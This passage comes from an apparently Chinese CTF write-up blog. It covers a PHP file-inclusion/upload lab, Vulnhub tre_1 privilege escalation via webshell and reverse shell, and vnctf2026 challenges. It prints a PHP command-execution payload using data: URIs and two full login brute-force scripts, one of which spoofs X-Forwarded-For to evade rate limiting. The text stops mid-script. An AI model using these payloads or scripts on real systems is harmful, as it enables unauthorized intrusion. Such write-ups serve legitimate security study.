)</span><br>&#123;<br>header(&#x27;Location: index.php&#x27;, true, 302);<br>exit();<br><br>&#125;<br><br><br><br>echo &quot;Welcome to Lab &quot;;<br>echo &#x27;&lt;form method=post style=&quot;margin: 10px 0px 10px 95%;&quot;&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;&#x27;;<br><span class="hljs-meta prompt_">if(isset($</span><span class="language-bash">_POST[<span class="hljs-string">&#x27;lg&#x27;</span>]))</span><br>&#123;<br><span class="hljs-meta prompt_">unset($</span><span class="language-bash">_SESSION[<span class="hljs-string">&#x27;logged&#x27;</span>]);</span><br><span class="hljs-meta prompt_">unset($</span><span class="language-bash">_SESSION[<span class="hljs-string">&#x27;admin&#x27;</span>]);</span><br>header(&#x27;Location: index.php&#x27;, true, 302);<br>&#125;<br>echo &#x27;&lt;hr&gt;&lt;br&gt;&#x27;;<br><br>echo &#x27;&lt;form method=post&gt;<br><br>&lt;select name=load&gt;<br>    &lt;option value=&quot;show&quot;&gt;Show Users&lt;/option&gt;<br>&lt;option value=&quot;add&quot;&gt;Add User&lt;/option&gt;<br>&lt;/select&gt;<br><br> &amp;nbsp&lt;input type=submit name=continue value=&quot;continue&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&#x27;;<br><span class="hljs-meta prompt_">if(isset($</span><span class="language-bash">_POST[<span class="hljs-string">&#x27;continue&#x27;</span>]))</span><br>&#123;<br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">dir</span>=getcwd();</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">choice=str_replace(<span class="hljs-string">&#x27;./&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">if($</span><span class="language-bash">choice===<span class="hljs-string">&#x27;add&#x27;</span>)</span><br>&#123;<br>       include($dir.&#x27;/&#x27;.$choice.&#x27;.php&#x27;);<br>die();<br>&#125;<br><br>        if($choice===&#x27;show&#x27;)<br>&#123;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">include($</span><span class="language-bash"><span class="hljs-built_in">dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);</span><br>die();<br>&#125;<br>else<br>&#123;<br><span class="hljs-meta prompt_">include($</span><span class="language-bash"><span class="hljs-built_in">dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);</span><br>&#125;<br><br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">if(isset($</span><span class="language-bash">_POST[<span class="hljs-string">&#x27;upload&#x27;</span>]))</span><br>&#123;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">name=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">address=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;address&#x27;</span>]);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);</span><br><br>if(!empty($_FILES[&#x27;image&#x27;][&#x27;name&#x27;]))<br>&#123;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">iname=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">r=pathinfo(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">image=array(<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);</span><br><span class="hljs-meta prompt_">if(in_array($</span><span class="language-bash">r,<span class="hljs-variable">$image</span>))</span><br>&#123;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">finfo = @new finfo(FILEINFO_MIME);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">filetype = @<span class="hljs-variable">$finfo</span>-&gt;file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);</span><br>if(preg_match(&#x27;/image\/jpeg/&#x27;,$filetype )  || preg_match(&#x27;/image\/png/&#x27;,$filetype ) || preg_match(&#x27;/image\/gif/&#x27;,$filetype ))<br>&#123;<br>if (move_uploaded_file($_FILES[&#x27;image&#x27;][&#x27;tmp_name&#x27;], &#x27;uploaded_images/&#x27;.$_FILES[&#x27;image&#x27;][&#x27;name&#x27;]))<br> &#123;<br>  echo &quot;Uploaded successfully &quot;;<br>  $update=&#x27;insert into users(name,address,image,id) values(\&#x27;&#x27;.$name.&#x27;\&#x27;,\&#x27;&#x27;.$address.&#x27;\&#x27;,\&#x27;&#x27;.$iname.&#x27;\&#x27;, \&#x27;&#x27;.$id.&#x27;\&#x27;)&#x27;;<br> mysqli_query($conn, $update);<br><br>&#125;<br>&#125;<br>else<br>&#123;<br>echo &quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;;<br>&#125;<br>&#125;<br>else<br>&#123;<br>echo &quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;;<br><br>&#125;<br>&#125;<br><br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>然后得到渗透路径</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770534586583-b075defc-b50f-46a3-8af5-7871b3753e9c.png"></p><p>上传图片马</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770534636247-b4b12bab-a59e-42f9-9447-fbdd1c1240f1.png"></p><p>然后在panel通过show读取图片马路径</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770534805454-c704bfa5-d5b7-4964-bb66-545d3ad1caf6.png"></p><p>接下来就是读取flag</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770534882249-9f1f37b0-3a8f-4cc8-80b0-0a42fb4d7c25.png"></p><p>成功读取</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770534920248-ec9418c2-3c46-432f-88dc-56bc9321e07f.png"></p><h1 id="内部监控暴露"><a href="#内部监控暴露" class="headerlink" title="内部监控暴露"></a>内部监控暴露</h1><p>打开是一个等待页面，我们直接扫目录</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770535129361-0a85ec11-27f4-4efe-bba7-b1b09cd4f551.png"></p><p>systemchart.php是一个get登录验证。info是phpinfo页面，blocks和chart用admin/admin进去后就是404，文件不存在</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770535371810-e66ca97e-2931-4f57-a384-6328ea1ac935.png"></p><p>又扫了一遍，发现了一些新东西</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770537020475-535fbb64-42d9-489e-bd2e-9ded5a310784.png"></p><p>打开发现是mantis，然后直接用mantis的历史漏洞去试</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770539159631-9233f48f-024b-4ffb-8ba8-4070b9d2d8e6.png"></p><p>但是不知道是不出网还是我的云服务器在国外连不上，只能手动去复现，但是这个漏洞确实是成功了的，因为可以用重置后的password登录进去，没办法反弹，那我们就写一个webshell</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770540289397-70c68e43-eae3-4e1e-a713-93c197bfdebc.png"></p><p>没办法直接读，得提权</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770540362075-a4049a03-d264-482c-9c91-f8a31cebc54e.png"></p><p>用蚁剑手动反弹一个shell，然后上传linpeas.sh，执行，原来之前反弹不成功是没有bash，用nc才成功，linpeas.sh也没发现什么有用的内容，后面看了别人的wp是通过计划任务反弹，然后有一个root的小文件，但是任何人都可以更改</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770543815100-fafcabe1-fb76-4179-aada-2f3968394646.png"></p><p>往其中插入反弹shell的语句即可</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770543842935-659be2f7-f150-4f26-91a0-f9c97038d328.png"></p><p>挺奇怪的，不知道是不是我的shell问题还是怎么，linpeas应该是可以把这种文件找出来的，但是并没有找到</p><p>别人wp：<a href="https://www.cnblogs.com/cchl/articles/vulnhub_tre_1.html#%E6%96%B9%E6%B3%95%E4%B8%89%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8">Vulnhub打靶记录：tre_1 - C_CHL - 博客园</a></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最近的一些比赛</title>
    <link href="/%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%AF%94%E8%B5%9B/"/>
    <url>/%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%AF%94%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>最近新人赛还挺多的，都集中在这几天，做的还是满赶的，还好我也不是正经打比赛的，就是练习的，不是很着急。不得不说比赛和平时刷题还是不一样的，还有一个本校的hgame2026，这个因为还没结束，还不能放出wp</p><h1 id="阿里云CTF2026"><a href="#阿里云CTF2026" class="headerlink" title="阿里云CTF2026"></a>阿里云CTF2026</h1><p>这个比赛就做了一个签到，后面的就不是我这个菜鸟能碰瓷的了</p><h2 id="Easy-Login"><a href="#Easy-Login" class="headerlink" title="Easy Login"></a>Easy Login</h2><p>把源码交给Gemini分析</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769842367534-8678fb3e-6062-4009-9d2c-809ef1f4b4d6.png"></p><p>然后先用正常网址让visit访问，然后再构造cookie</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769842400827-4cb4e654-1734-472e-8096-ebcd4f54cb78.png"></p><h1 id="vnctf2026"><a href="#vnctf2026" class="headerlink" title="vnctf2026"></a>vnctf2026</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825048105-58c22be7-71b3-43d3-972a-19af55cfebca.png"></p><p>php代码审计</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825161713-2f4eba23-3c37-4e9c-ba7b-60085085465c.png"></p><p>根据ai给的引导，我们先构造一个短标签+data协议</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">data:,&lt;?=`ls`;<br></code></pre></td></tr></table></figure><p>成功执行了，现在找flag就行了，同时注意payload长度</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825264126-4b7968dc-40b1-4b6a-a73d-541acdaf202c.png"></p><p>然后思路是用一句话木马</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825464179-dd8b027d-9040-4a7a-ad12-677b782988dd.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">data:,&lt;?=`$_GET[a]`;&amp;a=ls /<br></code></pre></td></tr></table></figure><p>也是成功绕过了，拿到了flag</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825657541-671f87f6-c0f1-4953-aa2f-625ccca26a2d.png"></p><p>这个题目难度对于老手来说肯定很简单，毕竟签到题，对我们这样的新手来说要熟悉php源码，并且知道data协议不用//也可以</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825811998-b4d90836-f36d-4e17-a04d-3fcbc85a2b77.png"></p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826635536-d042c905-e91c-4b48-998f-3cc9efdcf526.png"></p><p>访问是一个登录页面，题目还给了一个password附件，可能是爆破，登录的请求包应该是做了加密处理的</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826711133-a5df40b9-4913-4fb8-b1ba-17fa1845b9c5.png"></p><p>base64解码之后发现是p，q，n，一开始想的是rsa，但是后面又否定，因为pq都是计算私钥用的东西，怎么是自己提供给服务器，然后将js文件发给Gemini，得到结果</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826924969-7586fa85-444f-4b78-9c82-9a5b134a7d25.png"></p><p>好家伙，这就很难搞了，我一直对js一窍不通，后面还是让Gemini先写一个脚本试试，但是不知道是加密方式有问题还是怎么，反正服务端返回something went wrong，搞得我只能用webdriver开启模拟浏览器，然后一个个密码输入进去，模拟点击登录，同时还要限制速率，不然服务端会提示hacker，花了我好几个小时，总算是弄出来了</p><p>爆破脚本在这</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs shell">import random<br>import time<br>import threading<br>from concurrent.futures import ThreadPoolExecutor<br>from tqdm import tqdm<br>from selenium import webdriver<br>from selenium.webdriver.common.by import By<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">================= 配置区 =================</span><br>TARGET_URL = &quot;http://114.66.24.228:31046/&quot;<br>USERNAME = &quot;admin&quot;<br>THREAD_COUNT = 3<br>STOP_EVENT = threading.Event()<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">================= 核心工作函数 =================</span><br><br>def get_random_ip() :<br>    return f&quot;&#123;random.randint( 1 , 255 )&#125;.&#123;random.randint( 1 , 255 )&#125;.&#123;random.randint( 1 , 255 )&#125;.&#123;random.randint( 1 , 255 )&#125;&quot;<br><br><br>def worker(password_list , pbar) :<br>    if STOP_EVENT.is_set() :<br>        return<br><br>    # 使用标准 Selenium<br>    options = webdriver.ChromeOptions()<br>    # options.add_argument(&quot;--headless&quot;)<br>    driver = webdriver.Chrome( options=options )<br><br>    driver.get( TARGET_URL )<br><br>    try :<br>        for pwd in password_list :<br>            if STOP_EVENT.is_set() :<br>                break<br><br>            try :<br>                # --- 关键：利用 CDP 协议在发包前修改 Header ---<br>                # 这种方法不依赖任何第三方库，直接控制 Chrome 内核<br>                random_ip = get_random_ip()<br>                driver.execute_cdp_cmd( &#x27;Network.enable&#x27; , &#123;&#125; )<br>                driver.execute_cdp_cmd( &#x27;Network.setExtraHTTPHeaders&#x27; , &#123;<br>                    &#x27;headers&#x27; : &#123;&#x27;X-Forwarded-For&#x27; : random_ip&#125;<br>                &#125; )<br><br>                # 定位元素<br>                user_box = driver.find_element( By.CSS_SELECTOR , &quot;input[type=&#x27;text&#x27;]&quot; )<br>                pass_box = driver.find_element( By.CSS_SELECTOR , &quot;input[type=&#x27;password&#x27;]&quot; )<br>                login_btn = driver.find_element( By.TAG_NAME , &quot;button&quot; )<br>                result_label = driver.find_element( By.ID , &quot;result&quot; )<br><br>                # 输入与点击<br>                user_box.clear()<br>                user_box.send_keys( USERNAME )<br>                pass_box.clear()<br>                pass_box.send_keys( pwd )<br>                login_btn.click()<br><br>                # 等待回包<br>                time.sleep( 0.6 )<br>                status = result_label.text.strip()<br><br>                if &quot;hacker&quot; in status.lower() :<br>                    pbar.write( f&quot;[!] 触发 WAF (hacker!) - 正在使用 IP: &#123;random_ip&#125;&quot; )<br>                    time.sleep( 1.5 )<br>                    continue<br><br>                if &quot;login failed!&quot; in status :<br>                    pbar.update( 1 )<br>                    continue<br><br>                # 成功判断<br>                if status and &quot;login failed!&quot; not in status :<br>                    STOP_EVENT.set()<br>                    pbar.write( f&quot;\n\n&#123;&#x27;=&#x27; * 50&#125;\n[SUCCESS] 密码正确: &#123;pwd&#125;\n[RESULT]: &#123;status&#125;\n&#123;&#x27;=&#x27; * 50&#125;&quot; )<br>                    break<br><br>            except Exception :<br>                driver.get( TARGET_URL )<br>                time.sleep( 1 )<br>                continue<br>    finally :<br>        driver.quit()<br><br><br>def brute_force() :<br>    # 读取字典<br>    with open( &#x27;password&#x27; , &#x27;r&#x27; ) as f :<br>        passwords = [ line.strip() for line in f if line.strip() ]<br><br>    # 置顶已知可能的密码<br>    target_pwd = &quot;QQr0T7AvjtaSxFbiqv3yv7zw&quot;<br>    if target_pwd in passwords :<br>        passwords.remove( target_pwd )<br>    passwords.insert( 0 , target_pwd )<br><br>    total = len( passwords )<br>    chunk_size = (total // THREAD_COUNT) + 1<br>    password_chunks = [ passwords[ i :i + chunk_size ] for i in range( 0 , total , chunk_size ) ]<br><br>    pbar = tqdm( total=total , desc=&quot;CDP-Bruting&quot; , unit=&quot;pwd&quot; , dynamic_ncols=True )<br><br>    with ThreadPoolExecutor( max_workers=THREAD_COUNT ) as executor :<br>        futures = [ executor.submit( worker , chunk , pbar ) for chunk in password_chunks ]<br>        for future in futures :<br>            future.result()<br><br>    pbar.close()<br><br><br>if __name__ == &quot;__main__&quot; :<br>    brute_force()<br></code></pre></td></tr></table></figure><p>运行该脚本需要本地安装了chrome的webdriver，且版本需要对应上</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850367570-e059dd6f-4706-421a-9005-be46443912f8.png"></p><p>做完第二天，在群里听了大佬的指导后，将js脚本反混淆一下给ai，成功写出了一个可爆破的脚本，这个脚本不管什么时候都可以用，不过就是没有解密响应体，要自己去浏览器输出得到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs shell">import json<br>import base64<br>import hashlib<br>import requests<br>import time<br>import binascii<br>import uuid<br>from gmssl import sm4<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">🔴 必填区域：请填入你刚才在浏览器控制台 getFinalPackage() 捕获到的值</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 捕获到的 Key (32位 Hex)</span><br>CAPTURED_KEY = &quot;6a8d6af94060a07eba08f741ffc17fd3&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 捕获到的 IV (32位 Hex)</span><br>CAPTURED_IV = &quot;8d1061d89dd8983672d10a3c96647a54&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. 捕获到的 Payload 里的 q 值 (SM2密文，非常长的那一段)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">注意：是从抓到的 json 里的 <span class="hljs-string">&quot;q&quot;</span>: <span class="hljs-string">&quot;...&quot;</span> 里面复制出来，不要带引号</span><br>CAPTURED_Q = &quot;367086fd33ab79866dca19f3bab3db2878cf797c9bc91039f0d06d149737499f3ccf261bff08d2de1ea16cf097752920a25db59c1e623dfbef0549c14bc1315b1666abc86b54e1ba838e49630933bd424ab762587386adb6aa6c7e7c2af0d3916a4a4d332f4f02a65156c448fa8678b692d42c4cf064ed150748c5e59c25c44ff0dd2a7402dd15133acd0b10760b14aa45df951f189f993a55edbf2c3e5089ac9e262abba9be8e9261799e22b596d17c8737&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">🟢 配置区域 (固定值)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br>SALT = &quot;|Infernity|&quot;<br>TARGET_URL = &quot;http://114.66.24.228:33336/login&quot;  # 确认端口<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">转换 Key 为二进制</span><br>KEY_BYTES = binascii.unhexlify( CAPTURED_KEY )<br>IV_BYTES = binascii.unhexlify( CAPTURED_IV )<br><br><br>def sm4_encrypt(plain_text) :<br>    &quot;&quot;&quot;SM4 CBC 加密&quot;&quot;&quot;<br>    crypt_sm4 = sm4.CryptSM4()<br>    crypt_sm4.set_key( KEY_BYTES , sm4.SM4_ENCRYPT )<br>    # gmssl 自动处理 PKCS7 填充<br>    encrypt_value = crypt_sm4.crypt_cbc( IV_BYTES , plain_text.encode() )<br>    return encrypt_value.hex()<br><br><br>def sm4_decrypt(b64_cipher) :<br>    &quot;&quot;&quot;SM4 CBC 解密&quot;&quot;&quot;<br>    try :<br>        cipher_bytes = base64.b64decode( b64_cipher )<br>        crypt_sm4 = sm4.CryptSM4()<br>        crypt_sm4.set_key( KEY_BYTES , sm4.SM4_DECRYPT )<br>        decrypt_value = crypt_sm4.crypt_cbc( IV_BYTES , cipher_bytes )<br>        return decrypt_value.decode( &#x27;utf-8&#x27; , errors=&#x27;ignore&#x27; )<br>    except :<br>        return None<br><br><br>def solve() :<br>    # 0. 准备固定的 KeyIvJson (用于 MD5 校验)<br>    # 必须无空格，与 JS 生成的一致<br>    key_iv_dict = &#123;&quot;key&quot; : CAPTURED_KEY , &quot;iv&quot; : CAPTURED_IV&#125;<br>    key_iv_json = json.dumps( key_iv_dict , separators=(&#x27;,&#x27; , &#x27;:&#x27;) )<br><br>    print( f&quot;[*] 使用固定 Q 值爆破&quot; )<br>    print( f&quot;[*] Key: &#123;CAPTURED_KEY&#125;&quot; )<br>    print( f&quot;[*] IV:  &#123;CAPTURED_IV&#125;&quot; )<br><br>    # 1. 读取字典<br>    try :<br>        with open( &#x27;password&#x27; , &#x27;r&#x27; ) as f :<br>            passwords = [ line.strip() for line in f if line.strip() ]<br>    except :<br>        print( &quot;[-] 错误：找不到 password 文件&quot; )<br>        return<br><br>    print( f&quot;[*] 开始爆破 &#123;len( passwords )&#125; 个密码...&quot; )<br><br>    # 2. 循环爆破<br>    for pwd in passwords :<br>        # 构造 UserInfo<br>        # 严格遵循 Hook 到的字段顺序: userName -&gt; passWord -&gt; timeStamp -&gt; TOKEN<br>        # 注意：timeStamp 使用当前时间，TOKEN 模拟 MD5 格式<br>        user_info = &#123;<br>            &quot;userName&quot; : &quot;admin&quot; ,<br>            &quot;passWord&quot; : pwd ,<br>            &quot;timeStamp&quot; : int( time.time() * 1000 ) ,<br>            &quot;TOKEN&quot; : hashlib.md5( str( uuid.uuid4() ).encode() ).hexdigest()<br>        &#125;<br>        # 序列化 (去空格)<br>        user_info_json = json.dumps( user_info , separators=(&#x27;,&#x27; , &#x27;:&#x27;) )<br><br>        # 生成 p (加密新的 user_info)<br>        p_val = sm4_encrypt( user_info_json )<br><br>        # 生成 n (计算新的校验值)<br>        # 公式: UserInfo + Salt + KeyIv<br>        n_source = 